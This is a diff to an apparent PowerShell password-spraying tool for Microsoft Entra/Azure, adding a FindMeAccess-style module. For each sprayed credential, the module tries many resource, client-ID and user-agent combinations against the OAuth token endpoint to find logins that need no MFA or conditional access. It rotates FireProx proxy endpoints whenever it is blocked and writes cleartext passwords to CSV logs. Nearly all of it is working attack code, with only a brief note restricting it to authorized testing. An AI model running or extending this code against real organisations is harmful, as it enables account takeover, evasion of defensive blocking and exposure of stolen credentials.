@@ -23,10 +23,14 @@
       6. MFA SWEEP: when -MFASweepPath is supplied, each successful credential is
          immediately run through MFASweep (non-interactively) to find which
          Microsoft services allow single-factor access. Results are logged.
+      7. ACCESS AUDIT: with -AccessAudit, each successful credential is run
+         through a FindMeAccess-style audit that sweeps resource x client-id x
+         user-agent combinations to find which grant single-factor (no-MFA /
+         no-conditional-access) access. Runs through FireProx and is logged.
 
-    Request/response handling mirrors MSOLSpray and the MFA sweep reuses
-    MFASweep -- both by Beau Bullock (@dafthack). See MSOLSpray/MSOLSpray.ps1 for
-    the reference spray implementation.
+    Request/response handling mirrors MSOLSpray, the MFA sweep reuses MFASweep
+    (both by Beau Bullock, @dafthack), and the access audit is ported from
+    FindMeAccess (@absolomb).
 
 .EXAMPLE
     .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
@@ -46,6 +50,13 @@
         -FireProxPath /path/to/fireprox/fire.py `
         -AwsProfile myprofile -AccessKey "AKIA..." -SecretAccessKey "xxxxx" `
         -MFASweepPath /path/to/MFASweep/MFASweep.ps1 -IncludeADFS
+
+.EXAMPLE
+    # Audit MFA / conditional-access gaps on each valid credential
+    .\Sirocco.ps1 -UserListPath .\users.txt -PasswordListPath .\passwords.txt `
+        -FireProxPath /path/to/fireprox/fire.py `
+        -AwsProfile myprofile -AccessKey "AKIA..." -SecretAccessKey "xxxxx" `
+        -AccessAudit -AuditConfig .\audit.conf
 
 .NOTES
     Authorized security testing only. Passing AWS keys on the command line
@@ -116,7 +127,37 @@ param (
 
     # Include the on-prem ADFS login attempt in the MFA sweep.
     [Parameter(Mandatory = $false)]
-    [switch]$IncludeADFS
+    [switch]$IncludeADFS,
+
+    # ----- MFA / conditional-access gap audit (FindMeAccess-style) -----
+    # When set, every successful spray result is followed by an audit that
+    # sweeps resource x client-id x user-agent combinations to find which ones
+    # grant single-factor (no-MFA / no-conditional-access) access.
+    [Parameter(Mandatory = $false)]
+    [switch]$AccessAudit,
+
+    # Sweep every built-in user agent (large matrix). Default: one UA only.
+    [Parameter(Mandatory = $false)]
+    [switch]$AuditAllUserAgents,
+
+    # Restrict the audit to a single resource / client / user agent (name or value).
+    [Parameter(Mandatory = $false)]
+    [string]$AuditResource = "",
+
+    [Parameter(Mandatory = $false)]
+    [string]$AuditClient = "",
+
+    [Parameter(Mandatory = $false)]
+    [string]$AuditUserAgent = "",
+
+    # Config file with [resources] / [clients] / [user_agents] sections to
+    # restrict the audit matrix (FindMeAccess-compatible format).
+    [Parameter(Mandatory = $false)]
+    [string]$AuditConfig = "",
+
+    # Delay in milliseconds between audit requests (throttle).
+    [Parameter(Mandatory = $false)]
+    [int]$AuditDelayMs = 0
 )
 
 # ----------------------------------------------------------------------------
@@ -146,6 +187,7 @@ $script:Endpoints = Join-Path $LogDirectory "fireprox_endpoints_$stamp.txt"
 $script:RemovedLog = Join-Path $LogDirectory "refinery_removed_$stamp.txt"
 $script:MfaCsv     = Join-Path $LogDirectory "mfa_results_$stamp.csv"
 $script:MfaRawLog  = Join-Path $LogDirectory "mfa_raw_$stamp.log"
+$script:AuditCsv   = Join-Path $LogDirectory "access_audit_$stamp.csv"
 
 # Case-insensitive set of users found NOT to exist in Azure/Entra.
 $script:InvalidUsers = New-Object System.Collections.Generic.HashSet[string]([System.StringComparer]::OrdinalIgnoreCase)
@@ -354,6 +396,275 @@ function Invoke-SiroccoMfaSweep {
 }
 
 # ----------------------------------------------------------------------------
+# MFA / conditional-access gap audit (ported from FindMeAccess by @absolomb).
+# For a valid credential, sweeps resource x client-id x user-agent combinations
+# against the token endpoint (through FireProx) to find which grant single-
+# factor access (200 = no MFA / no conditional access). Everything else is
+# classified by AADSTS code. https://github.com/absolomb/FindMeAccess
+# ----------------------------------------------------------------------------
+$script:AuditResources = [ordered]@{
+    "Azure Graph API"        = "https://graph.windows.net"
+    "Azure Management API"   = "https://management.azure.com"
+    "Azure Data Catalog"     = "https://datacatalog.azure.com"
+    "Azure Key Vault"        = "https://vault.azure.net"
+    "Cloud Webapp Proxy"     = "https://proxy.cloudwebappproxy.net/registerapp"
+    "Database"               = "https://database.windows.net"
+    "Microsoft Graph API"    = "https://graph.microsoft.com"
+    "msmamservice"           = "https://msmamservice.api.application"
+    "Office Management"      = "https://manage.office.com"
+    "Office Apps"            = "https://officeapps.live.com"
+    "OneNote"                = "https://onenote.com"
+    "Outlook"                = "https://outlook.office365.com"
+    "Outlook SDF"            = "https://outlook-sdf.office.com"
+    "Sara"                   = "https://api.diagnostics.office.com"
+    "Skype For Business"     = "https://api.skypeforbusiness.com"
+    "Spaces Api"             = "https://api.spaces.skype.com"
+    "Webshell Suite"         = "https://webshell.suite.office.com"
+    "Windows Management API" = "https://management.core.windows.net"
+    "Yammer"                 = "https://api.yammer.com"
+}
+
+$script:AuditClients = [ordered]@{
+    "Accounts Control UI"                           = "a40d7d7d-59aa-447e-a655-679a4107e548"
+    "Copilot App"                                   = "14638111-3389-403d-b206-a6a71d9f8f16"
+    "Designer App"                                  = "598ab7bb-a59c-4d31-ba84-ded22c220dbd"
+    "Editor Browser Extension"                      = "1a20851a-696e-4c7e-96f4-c282dfe48872"
+    "Enterprise Roaming and Backup"                 = "60c8bde5-3167-4f92-8fdb-059f6176dc0f"
+    "Get Help"                                      = "1f7f6f43-2f81-429c-8499-293566d0ab0c"
+    "Intune MAM"                                    = "6c7e8096-f593-4d72-807f-a5f86dcc9c77"
+    "Loop"                                          = "0922ef46-e1b9-4f7e-9134-9ad00547eb41"
+    "M365 Compliance Drive Client"                  = "be1918be-3fe3-4be9-b32b-b542fc27f02e"
+    "Managed Home Screen"                           = "3b68e96c-82d3-41b3-99b8-56c260cf38d8"
+    "Microsoft 365 Copilot"                         = "0ec893e0-5785-4de6-99da-4ed124e5296c"
+    "Microsoft Authentication Broker"               = "29d9ed98-a469-4536-ade2-f981bc1d605e"
+    "Microsoft Authenticator App"                   = "4813382a-8fa7-425e-ab75-3b753aab3abb"
+    "Microsoft Azure CLI"                           = "04b07795-8ddb-461a-bbee-02f9e1bf7b46"
+    "Microsoft Azure PowerShell"                    = "1950a258-227b-4e31-a9cf-717495945fc2"
+    "Microsoft Bing Search for Microsoft Edge"      = "2d7f3606-b07d-41d1-b9d2-0d0c9296a6e8"
+    "Microsoft Bing Search"                         = "cf36b471-5b44-428c-9ce7-313bf84528de"
+    "Microsoft Defender for Mobile"                 = "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3"
+    "Microsoft Defender Platform"                   = "cab96880-db5b-4e15-90a7-f3f1d62ffe39"
+    "Microsoft Docs"                                = "18fbca16-2224-45f6-85b0-f7bf2b39b3f3"
+    "Microsoft Edge Enterprise New Tab Page"        = "d7b530a4-7680-4c23-a8bf-c52c121d2e87"
+    "Microsoft Edge MSAv2"                          = "82864fa0-ed49-4711-8395-a0e6003dca1f"
+    "Microsoft Edge"                                = "e9c51622-460d-4d3d-952d-966a5b1da34c"
+    "Microsoft Edge2"                               = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
+    "Microsoft Edge3"                               = "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34"
+    "Microsoft Exchange REST API Based Powershell"  = "fb78d390-0c51-40cd-8e17-fdbfab77341b"
+    "Microsoft Flow"                                = "57fcbcfa-7cee-4eb1-8b25-12d2030b4ee0"
+    "Microsoft Intune Company Portal"               = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
+    "Microsoft Intune Windows Agent"                = "fc0f3af4-6835-4174-b806-f7db311fd2f3"
+    "Microsoft Lists App on Android"                = "a670efe7-64b6-454f-9ae9-4f1cf27aba58"
+    "Microsoft Office"                              = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+    "Microsoft Planner"                             = "66375f6b-983f-4c2c-9701-d680650f588f"
+    "Microsoft Power BI"                            = "c0d2a505-13b8-4ae0-aa9e-cddd5eab0b12"
+    "Microsoft Stream Mobile Native"                = "844cca35-0656-46ce-b636-13f48b0eecbd"
+    "Microsoft Teams - Device Admin Agent"          = "87749df4-7ccf-48f8-aa87-704bad0e0e16"
+    "Microsoft Teams-T4L"                           = "8ec6bc83-69c8-4392-8f08-b3c986009232"
+    "Microsoft Teams"                               = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
+    "Microsoft To-Do client"                        = "22098786-6e16-43cc-a27d-191a01a1e3b5"
+    "Microsoft Tunnel"                              = "eb539595-3fe1-474e-9c1d-feb3625d1be5"
+    "Microsoft Whiteboard Client"                   = "57336123-6e14-4acc-8dcf-287b6088aa28"
+    "ODSP Mobile Lists App"                         = "540d4ff4-b4c0-44c1-bd06-cab1782d582a"
+    "Office 365 Exchange Online"                    = "00000002-0000-0ff1-ce00-000000000000"
+    "Office 365 Management"                         = "00b41c95-dab0-4487-9791-b9d2c32c80f2"
+    "OneDrive iOS App"                              = "af124e86-4e96-495a-b70a-90f90ab96707"
+    "OneDrive SyncEngine"                           = "ab9b8c07-8f02-4f72-87fa-80105867a763"
+    "OneDrive"                                      = "b26aadf8-566f-4478-926f-589f601d9c74"
+    "Outlook Lite"                                  = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
+    "Outlook Mobile"                                = "27922004-5251-4030-b22d-91ecd9a37ea4"
+    "PowerApps"                                     = "4e291c71-d680-4d0e-9640-0a3358e31177"
+    "SharePoint Android"                            = "f05ff7c9-f75a-4acd-a3b5-f4b6a870245d"
+    "SharePoint"                                    = "d326c1ce-6cc6-4de2-bebc-4591e5e13ef0"
+    "Universal Store Native Client"                 = "268761a2-03f3-40df-8a8b-c3db24145b6b"
+    "Visual Studio"                                 = "872cd9fa-d31f-45e0-9eab-6e460a02d1f1"
+    "Windows Search"                                = "26a7ee05-5602-4d76-a7ba-eae8b7b67941"
+    "Windows Spotlight"                             = "1b3c667f-cde3-4090-b60b-3d2abd0117f0"
+    "Yammer iPhone"                                 = "a569458c-7f2b-45cb-bab9-b7dee514d112"
+    "ZTNA Network Access Client Private"            = "760282b4-0cfc-4952-b467-c8e0298fee16"
+    "ZTNA Network Access Client"                    = "038ddad9-5bbe-4f64-b0cd-12434d1e633b"
+}
+
+$script:AuditUserAgents = [ordered]@{
+    "Windows 10 Chrome" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+    "Windows 10 Edge"   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.2277.128"
+    "Windows 10 IE11"   = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
+    "Mac Firefox"       = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0"
+    "Linux Firefox"     = "Mozilla/5.0 (X11; Linux i686; rv:94.0) Gecko/20100101 Firefox/94.0"
+    "Chrome OS"         = "Mozilla/5.0 (X11; CrOS x86_64 15633.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.212 Safari/537.36"
+    "Android Chrome"    = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.178 Mobile Safari/537.36"
+    "iPhone Safari"     = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
+    "Windows Phone"     = "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; NOKIA; Lumia 800)"
+}
+
+# Resolve a user-supplied name-or-value against a lookup dict -> [name, value].
+function Resolve-AuditEntry {
+    param($Entry, $Lookup)
+    if ($Lookup.Contains($Entry)) { return @($Entry, $Lookup[$Entry]) }
+    foreach ($k in $Lookup.Keys) { if ($Lookup[$k] -eq $Entry) { return @($k, $Entry) } }
+    return @("Custom ($Entry)", $Entry)
+}
+
+# Parse a FindMeAccess-style config file into three ordered dicts.
+function Read-AuditConfig {
+    param([string]$Path)
+    $out = @{ resources = [ordered]@{}; clients = [ordered]@{}; user_agents = [ordered]@{} }
+    $lookup = @{ resources = $script:AuditResources; clients = $script:AuditClients; user_agents = $script:AuditUserAgents }
+    $section = $null
+    foreach ($raw in Get-Content $Path) {
+        $line = $raw.Trim()
+        if ($line -eq "") { continue }
+        if ($line -match '^\[(resources|clients|user_agents)\]$') { $section = $Matches[1]; continue }
+        if ($section) {
+            $pair = Resolve-AuditEntry -Entry $line -Lookup $lookup[$section]
+            $out[$section][$pair[0]] = $pair[1]
+        }
+    }
+    return $out
+}
+
+# Classify a single audit response (mirrors FindMeAccess AADSTS handling).
+function Get-AuditVerdict {
+    param($StatusCode, [string]$Body)
+    if ($StatusCode -eq 403 -or $Body -match 'Forbidden' -or $Body -match '\(403\)') {
+        return @{ Status = "FORBIDDEN"; Forbidden = $true; NoMfa = $false; Abort = $false; Detail = "Endpoint blocked" }
+    }
+    if ($StatusCode -eq 200) {
+        $scope = "openid"
+        $m = [regex]::Match($Body, '"scope"\s*:\s*"([^"]*)"')
+        if ($m.Success) { $scope = $m.Groups[1].Value }
+        return @{ Status = "NO-MFA"; Forbidden = $false; NoMfa = $true; Abort = $false; Detail = "scope: $scope" }
+    }
+    switch -Regex ($Body) {
+        'AADSTS50079' { return @{ Status = "NO-MFA (enrollment req, not configured)"; NoMfa = $true;  Forbidden = $false; Abort = $false; Detail = "MFA enrollment required but not set up" } }
+        'AADSTS50076' { return @{ Status = "MFA-REQUIRED";        NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Microsoft MFA required or blocked by CA" } }
+        'AADSTS53003' { return @{ Status = "CA-BLOCKED";          NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Blocked by conditional access policy" } }
+        'AADSTS50105' { return @{ Status = "CA-APP-BLOCKED";      NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Application blocked by conditional access" } }
+        'AADSTS50158' { return @{ Status = "THIRD-PARTY-MFA";     NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Third-party MFA required" } }
+        'AADSTS53000' { return @{ Status = "COMPLIANT-DEVICE";    NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Requires compliant/managed device" } }
+        'AADSTS65001' { return @{ Status = "CONSENT-REQUIRED";    NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "User/admin consent required" } }
+        'AADSTS65002' { return @{ Status = "CLIENT-NOT-AUTHZ";    NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Client_id not authorized for resource" } }
+        'AADSTS7000112' { return @{ Status = "APP-DISABLED";      NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Application disabled" } }
+        'AADSTS7000218' { return @{ Status = "SECRET-REQUIRED";   NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "client_assertion/secret required" } }
+        'AADSTS53011' { return @{ Status = "USER-BLOCKED-RISK";   NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "User blocked due to risk" } }
+        'AADSTS53004' { return @{ Status = "SUSPICIOUS-ACTIVITY"; NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Suspicious activity" } }
+        'AADSTS500014' { return @{ Status = "SP-DISABLED";        NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Service principal disabled" } }
+        'AADSTS50001' { return @{ Status = "RESOURCE-DISABLED";   NoMfa = $false; Forbidden = $false; Abort = $false; Detail = "Resource disabled or missing" } }
+        # These indicate the credential/account is no longer usable -> abort audit.
+        'AADSTS50053' { return @{ Status = "LOCKED";  NoMfa = $false; Forbidden = $false; Abort = $true;  Detail = "Account locked" } }
+        'AADSTS50057' { return @{ Status = "DISABLED"; NoMfa = $false; Forbidden = $false; Abort = $true; Detail = "Account disabled" } }
+        'AADSTS50055' { return @{ Status = "PASSWORD-EXPIRED"; NoMfa = $false; Forbidden = $false; Abort = $true; Detail = "Password expired" } }
+        default       {
+            $desc = ([regex]::Match($Body, '"error_description"\s*:\s*"([^"]*)"')).Groups[1].Value
+            return @{ Status = "OTHER"; NoMfa = $false; Forbidden = $false; Abort = $false; Detail = ($desc -replace '\s+', ' ').Trim() }
+        }
+    }
+}
+
+function Invoke-SiroccoAccessAudit {
+    param([string]$Username, [string]$Password)
+
+    # Resolve the matrix (config file > explicit filters > full built-ins).
+    if ($AuditConfig) {
+        if (-not (Test-Path $AuditConfig)) { throw "Audit config not found: $AuditConfig" }
+        $cfg = Read-AuditConfig -Path $AuditConfig
+        $resList = if ($cfg.resources.Count)   { $cfg.resources }   else { $script:AuditResources }
+        $cliList = if ($cfg.clients.Count)     { $cfg.clients }     else { $script:AuditClients }
+        $uaList  = if ($cfg.user_agents.Count) { $cfg.user_agents } else { [ordered]@{ "Windows 10 Chrome" = $script:AuditUserAgents["Windows 10 Chrome"] } }
+    }
+    else {
+        if ($AuditResource) { $p = Resolve-AuditEntry -Entry $AuditResource -Lookup $script:AuditResources; $resList = [ordered]@{ $p[0] = $p[1] } }
+        else { $resList = $script:AuditResources }
+
+        if ($AuditClient) { $p = Resolve-AuditEntry -Entry $AuditClient -Lookup $script:AuditClients; $cliList = [ordered]@{ $p[0] = $p[1] } }
+        else { $cliList = $script:AuditClients }
+
+        if ($AuditAllUserAgents) { $uaList = $script:AuditUserAgents }
+        elseif ($AuditUserAgent) { $p = Resolve-AuditEntry -Entry $AuditUserAgent -Lookup $script:AuditUserAgents; $uaList = [ordered]@{ $p[0] = $p[1] } }
+        else { $uaList = [ordered]@{ "Windows 10 Chrome" = $script:AuditUserAgents["Windows 10 Chrome"] } }
+    }
+
+    $total = $resList.Count * $cliList.Count * $uaList.Count
+    Write-RunLog "Access audit for $Username : $($resList.Count) resources x $($cliList.Count) clients x $($uaList.Count) UAs = $total combos." "Cyan"
+
+    $noMfaResources = New-Object System.Collections.Generic.HashSet[string]
+    $noMfaCount = 0
+    $done = 0
+
+    foreach ($resName in $resList.Keys) {
+        foreach ($cliName in $cliList.Keys) {
+            foreach ($uaName in $uaList.Keys) {
+                $done++
+                Write-Progress -Activity "Access audit: $Username" `
+                    -Status ("{0} of {1}  ({2} / {3})" -f $done, $total, $resName, $cliName) `
+                    -PercentComplete (($done / $total) * 100)
+
+                $body = @{
+                    'resource'    = $resList[$resName]
+                    'client_id'   = $cliList[$cliName]
+                    'client_info' = '1'
+                    'grant_type'  = 'password'
+                    'username'    = $Username
+                    'password'    = $Password
+                    'scope'       = 'openid'
+                }
+                $headers = @{ 'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded'; 'User-Agent' = $uaList[$uaName] }
+
+                $ErrorActionPreference = 'SilentlyContinue'
+                $resp = $null; $respErr = $null
+                $resp = Invoke-WebRequest "$script:CurrentUrl/common/oauth2/token" -Method Post `
+                    -Headers $headers -Body $body -ErrorVariable respErr -UseBasicParsing
+                $status = if ($resp) { $resp.StatusCode } else { $null }
+                $bodyText = if ($resp) { "$($resp.Content)" } else { "$respErr" }
+
+                $v = Get-AuditVerdict -StatusCode $status -Body $bodyText
+
+                if ($v.Forbidden) {
+                    # Rotate the FireProx endpoint and retry the same combination.
+                    Write-RunLog "Access audit hit FORBIDDEN; rotating FireProx endpoint." "Red"
+                    $script:CurrentUrl = New-FireProxUrl
+                    $done--   # don't count the blocked attempt
+                    continue
+                }
+
+                [pscustomobject]@{
+                    Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
+                    Username  = $Username
+                    Password  = $Password
+                    Resource  = $resName
+                    ClientId  = $cliName
+                    UserAgent = $uaName
+                    Status    = $v.Status
+                    Detail    = $v.Detail
+                } | Export-Csv -Path $script:AuditCsv -Append -NoTypeInformation
+
+                if ($v.NoMfa) {
+                    $noMfaCount++
+                    [void]$noMfaResources.Add($resName)
+                    Write-RunLog "  [NO-MFA] $resName | $cliName | $uaName ($($v.Detail))" "Green"
+                }
+
+                if ($v.Abort) {
+                    Write-RunLog "Access audit aborted for $Username : $($v.Detail)." "Red"
+                    Write-Progress -Activity "Access audit: $Username" -Completed
+                    return
+                }
+
+                if ($AuditDelayMs -gt 0) { Start-Sleep -Milliseconds $AuditDelayMs }
+            }
+        }
+    }
+
+    Write-Progress -Activity "Access audit: $Username" -Completed
+    if ($noMfaCount -gt 0) {
+        Write-RunLog "Access audit $Username : $noMfaCount single-factor combos across $($noMfaResources.Count) resources -> $($noMfaResources -join ', ')" "Green"
+    }
+    else {
+        Write-RunLog "Access audit $Username : no single-factor combinations found." "Yellow"
+    }
+}
+
+# ----------------------------------------------------------------------------
 # Main
 # ----------------------------------------------------------------------------
 function Invoke-Sirocco {
@@ -396,6 +707,17 @@ function Invoke-Sirocco {
     }
     else {
         Write-RunLog "MFA sweep DISABLED (supply -MFASweepPath to enable)." "DarkGray"
+    }
+
+    # Access / conditional-access gap audit (FindMeAccess-style).
+    if ($AccessAudit) {
+        if ($AuditConfig -and ($AuditResource -or $AuditClient -or $AuditUserAgent -or $AuditAllUserAgents)) {
+            throw "Cannot combine -AuditConfig with -AuditResource/-AuditClient/-AuditUserAgent/-AuditAllUserAgents."
+        }
+        Write-RunLog "Access audit ENABLED. Per-combination results -> $script:AuditCsv." "Cyan"
+    }
+    else {
+        Write-RunLog "Access audit DISABLED (supply -AccessAudit to enable)." "DarkGray"
     }
 
     # Establish the starting endpoint.
@@ -447,6 +769,11 @@ function Invoke-Sirocco {
                 # Run the MFA sweep against the freshly-confirmed credential.
                 if ($script:MfaEnabled) {
                     Invoke-SiroccoMfaSweep -Username $user -Password $password
+                }
+
+                # Run the MFA/conditional-access gap audit (FindMeAccess-style).
+                if ($AccessAudit) {
+                    Invoke-SiroccoAccessAudit -Username $user -Password $password
                 }
             }
             elseif ($r.UserAbsent) {
